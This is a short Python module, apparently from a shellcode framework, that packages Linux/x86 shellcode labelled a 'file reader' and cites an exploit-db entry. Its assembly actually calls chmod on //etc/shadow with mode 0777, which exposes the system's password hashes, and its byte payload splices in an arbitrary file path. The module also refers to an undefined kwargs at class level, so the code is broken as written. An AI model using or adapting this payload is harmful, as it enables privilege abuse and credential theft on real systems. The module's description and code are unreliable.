from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
	Shellcode.info["author"] = "B3mB4m"
	Shellcode.info["name"] = "Linux/x86 - file reader"
	Shellcode.info["references"] = [
		"https://www.exploit-db.com/exploits/37285/"
	]
	Shellcode.info["size"] = 19 + Shellcode.getsize(kwargs["file"])
	Shellcode.info["rawassembly"] = [
		"xor    %eax,%eax",
		"push   %eax",
		"push   $0x776f6461",
		"push   $0x68732f63",
		"push   $0x74652f2f",
		"mov    $0xf,%al",
		"mov    %esp,%ebx",
		"mov    $0x1ff,%cx",
		"int    $0x80",
		"xor    %eax,%eax",
		"inc    %eax",
		"int    $0x80",
	]

	
	def __init__(self, **kwargs): 
		Shellcode.info["payload"] = [
			r"\x31\xc0\x50"
			+kwargs["file"]+
			r"\xb0\x0f\x89\xe3\x66\xb9\xff"
			r"\x01\xcd\x80\x31\xc0\x40\xcd\x80"
		]
		


